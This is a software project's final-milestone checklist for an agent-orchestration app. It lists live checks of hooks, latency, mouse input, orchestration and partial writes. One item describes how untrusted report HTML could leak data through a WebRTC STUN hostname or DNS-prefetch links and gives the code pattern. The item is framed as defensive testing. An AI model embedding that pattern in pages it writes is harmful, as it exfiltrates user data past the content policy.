# 05 Final confirmation

> Goal: close out the handful of checks that could not be made during development, so the MVP ships with nothing
> outstanding.
> Completion criteria: every item below has been exercised on a real build and has a recorded outcome; anything that
> fails is either fixed or written back into the plan as a deliberate limitation.

This milestone exists because a few confirmations are impossible until the real product exists or until an external
credential is available. They block nothing earlier — each was checked for that — so they are gathered here rather than
holding earlier work up. Keep it last.

## Carried over

Only what genuinely cannot be settled yet; everything else raised along the way was closed where it was raised.

- [ ] **Grok's `StopFailure`.** The only hook event of the three agents that was never captured from a live session; its
      payload shape is taken from Grok's own documentation. Provoking it means pointing Grok's chat endpoint at a server
      that returns an error, which redirects an authenticated client's traffic and so needs the user's explicit
      authorisation. Note Grok's "turn finished" mapping names this event, so that branch is unexercised.
- [ ] **The end-to-end terminal latency the user actually perceives.** The daemon-to-WebSocket path measures well under a
      millisecond, but the rendering step on top of it can only be instrumented once the real application exists.
- [ ] **Mouse reporting past column 95.** The application forwards `xterm.js`'s `onBinary` events precisely so that a
      mouse report whose coordinate byte exceeds 127 still reaches the agent, and the forwarding was read line by line,
      but nothing available during development reacts to a click in a way that proves the report arrived — Claude Code's
      composer does not position its cursor by click. Confirm by using an agent TUI that does respond to the mouse, in a
      window wide enough to click past column 95, and check that the click lands where it was aimed.
- [ ] **One full orchestration loop, with real model turns.** Dispatch a task to a project through the hub, let the
      session do it, and watch the report arrive in the hub, the session archive itself, and the hub summarize. Nothing
      in the loop has ever run a model turn, so the whole turn-level half of the status mapping is unexercised: `working`
      during a turn, `waiting_user` at a permission prompt, Grok's two `Stop` fires, Codex's `Interrupt`. Check along the
      way that each session's role description actually reached its model (a Claude Code hub's appended system prompt, a
      Codex hub's `developer_instructions`, a Grok session's `--rules`) and that a dispatched `brief` arrives as the
      session's opening prompt — Claude Code's `--mcp-config` is list-valued, so the task is passed ahead of every flag,
      and that ordering has only been shown to parse, not to reach the model. Then let a session stop without calling
      `report` and confirm the synthesised report reaches the hub exactly once, on all three agents.
- [ ] **Several sessions raising their hand at once.** Confirm the hands bubble up to the right project and console rows
      without interfering, that one system notification fires per session entering the state, that the Dock badge tracks
      the count and clears, and that answering in the terminal clears the hand. Needs a person: scripted key injection
      bypasses the permission dialog this is about.
- [ ] **Whether Grok's `idle_prompt` fires exactly once per ending.** The daemon arms exactly one
      clock-attributed turn end per ending and spends it on the next `idle_prompt`, which is what
      keeps an echo of a finished turn from closing the turn running now. Two halves of that premise
      are unestablished, and failing either reintroduces the mis-attribution: that the backstop does
      not *repeat* while a session stays idle (a second echo arriving during a long quiet tool call
      would be read as that call's turn ending), and that it fires *at all* when new work starts
      inside the roughly 60-second delay (if it does not, the armed echo is spent on a later turn —
      and if that turn is one of the kinds Grok reports no stop event for at all, its own `idle_prompt`
      is swallowed and the turn never closes). Check both: leave a Grok session idle well past the
      delay and count the fires, then dispatch new work within the delay and see whether the previous
      ending's backstop still arrives.
- [ ] **A message the agent only half accepts.** When a PTY write is accepted in part and then times
      out, Octoboard drops that message and everything queued behind it, tells the sender, and shows
      the user a notice naming the session — and then writes into the session again as normal,
      because what the input line is actually left holding, and what clears it, is established for
      none of the three agents. The design assumes only that the next write closes the leftover
      fragment and is submitted with it, which bounds the damage at one spoiled message; that
      assumption is the bracketed-paste contract the rest of the mechanism already rests on, but it
      has not been seen happen. Provoke a partial write (a TUI held at a modal under a large paste is
      the likeliest route) and record, for each agent, what the line ends up holding, what the next
      message looks like when it arrives, and whether anything worse than one spoiled prompt follows.
      If something worse does, that is when a refuse-until-clean rule earns its keep — and the
      signal it would need has to be found first.
- [ ] **An instruction handed to a reopened session.** `reopen_session` with a `text` queues it and lets the agent's own
      first reported state release it, rather than writing into a process that has only just started. Confirm it is
      released once the agent is actually at its prompt, and in particular that a Claude Code session reopened in a
      directory it has not been trusted with does not have the queued text answer its trust dialog — nothing establishes
      whether its `SessionStart` fires before or after that dialog.
- [ ] **Whether a report page can push data out through a channel CSP does not reach.** The window's policy closes the
      one channel that was found and measured — a page navigating its own frame — but CSP has no directive WebKit
      enforces over WebRTC or over link-based DNS prefetch, and both are reachable with the `allow-scripts` the panel
      grants. A page could carry a payload in a hostname: `new RTCPeerConnection({iceServers:[{urls:"stun:<payload>.…"}]})`
      followed by `createOffer()`/`setLocalDescription()`, or a static or dynamically inserted
      `<link rel="dns-prefetch">` / `rel="preconnect">`. Neither has been exercised, so nothing is established either
      way; the product docs claim only what was measured. Observe it at the **DNS layer** — these channels leak through
      a name lookup, so an HTTP listener sees nothing even when the leak works — and give each probe a positive control,
      since a check expecting "no" proves nothing without one. Two things make this awkward and are worth knowing before
      starting: `tcpdump` needs a password, and the window's own policy blocks every in-app channel, so there is no
      in-app request to use as the control (Safari's lookups go through the same WebKit networking path and can serve as
      one instead). A non-root observation point that was validated: `log stream --predicate 'process == "mDNSResponder"'
      --style compact` logs every lookup, and although hostnames are redacted, the mask hash is name-derived and stable
      within a boot — so looking the same names up from a shell afterwards yields the hashes to search the capture for.
      Needs a person only in that the screen must be unlocked: the panel renders only for a *selected* hub session, and
      the application auto-selects only a session it opened itself, so mounting it takes a real click. If a leak is
      found, there is nothing in CSP to fix it with — record it as a limitation of showing untrusted model-authored HTML
      and say so in `docs/product/report-panel.md`.
- [ ] **The hub and its projects on different agents.** Confirm a console whose hub is one agent and whose projects
      default to another orchestrates normally, and that the hub's `start_session` `agent` argument overrides a
      project's default for that one session.

## Notes for developers

- **Development notes**: none of these is automatable. `StopFailure` needs the user to authorise pointing Grok's chat
  endpoint somewhere it will fail; the latency figure needs the real application's render loop instrumented; the
  orchestration items need real model turns, a running application and, for the raised hand, a person to answer a
  permission dialog. Gatekeeper admission is **not** here — it is 04's own completion criterion.
  Launching a session without a task costs no model turn and still proves the per-launch injection took: each agent
  connects its MCP servers at startup, so the `octoboardd mcp` child appearing for that session is the proof. That is
  how the injection half was settled; only the turn-level half is left.
  One technique worth reusing for the first item: pointing an agent at a local HTTP server that returns an error and dumps
  the request body makes its assembled prompt and its error-path behaviour readable at zero token cost. That is exactly
  what makes it credential-sensitive, which is why it needs authorisation rather than being done quietly.
- **Reference docs**: the conditions each of these qualifies are in `docs/mvp.md`, sections 4.4, 5.3 and 6.
